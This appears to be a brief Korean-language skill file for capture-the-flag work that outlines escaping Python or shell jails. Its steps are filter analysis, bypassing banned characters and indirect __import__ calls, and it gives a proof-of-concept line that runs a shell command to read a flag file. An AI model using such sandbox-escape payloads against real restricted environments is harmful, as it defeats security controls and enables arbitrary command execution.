---
name: jail-escape
description: 언어/셸 jail 필터 우회
---
## When
제한된 eval/셸

## Tools
python

## Procedure
1) 필터 규칙 분석
2) 금지문자 우회
3) 간접 호출·`__import__`
4) 명령

## PoC
```
__import__('os').system('cat flag')
```
변형

## Pitfalls
블랙리스트 우회 조합; 길이 제한
